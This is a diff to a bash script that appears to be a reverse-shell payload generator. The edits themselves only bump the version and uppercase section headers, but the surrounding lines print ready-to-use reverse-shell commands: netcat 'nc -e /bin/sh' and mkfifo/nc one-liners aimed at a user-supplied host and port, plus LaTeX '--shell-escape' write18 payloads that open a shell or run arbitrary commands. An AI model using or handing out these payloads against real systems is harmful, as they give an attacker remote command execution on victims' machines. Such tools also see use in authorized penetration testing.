@@ -24,7 +24,7 @@ printBanner()
  \___  / \___  /|__| /_______  /___|  /\___  /____/____/
 /_____/      \/              \/     \/     \/           
 
-	Version: 1.0.4 		Author: focab0r
+	Version: 1.0.5 		Author: focab0r
 '
 }
 
@@ -94,14 +94,14 @@ nodeShell()
 
 ncShell()
 {
-	echo -e "\n${BLUE}### Netcat ###${ENDCOLOR}"
+	echo -e "\n${BLUE}### NETCAT ###${ENDCOLOR}"
 	echo -e "${YELLOW}[1]${ENDCOLOR} nc -e /bin/sh ${GREEN}$1${ENDCOLOR} ${PURPLE}$2${ENDCOLOR}"
 	echo -e "${YELLOW}[2]${ENDCOLOR} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${GREEN}$1${ENDCOLOR} ${PURPLE}$2${ENDCOLOR} >/tmp/f"
 }
 
 latexShell()
 {
-	echo -e "\n${BLUE}### Latex ###${ENDCOLOR}"
+	echo -e "\n${BLUE}### LATEX ###${ENDCOLOR}"
 	echo -e "${YELLOW}[1]${ENDCOLOR} latex --shell-escape '\documentclass{article}"'\\'"begin{document}\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${GREEN}$1${ENDCOLOR} ${PURPLE}$2${ENDCOLOR} >/tmp/f}"'\\'"end{document}'"
 }
 
@@ -150,7 +150,7 @@ rubyCommand()
 
 latexCommand()
 {
-        echo -e "\n${BLUE}### Latex ###${ENDCOLOR}"
+        echo -e "\n${BLUE}### LATEX ###${ENDCOLOR}"
         echo -e "${YELLOW}[1]${ENDCOLOR} latex --shell-escape '\documentclass{article}"'\\'"begin{document}\immediate\write18{${RED}$@${ENDCOLOR}}"'\\'"end{document}'"
 
 }
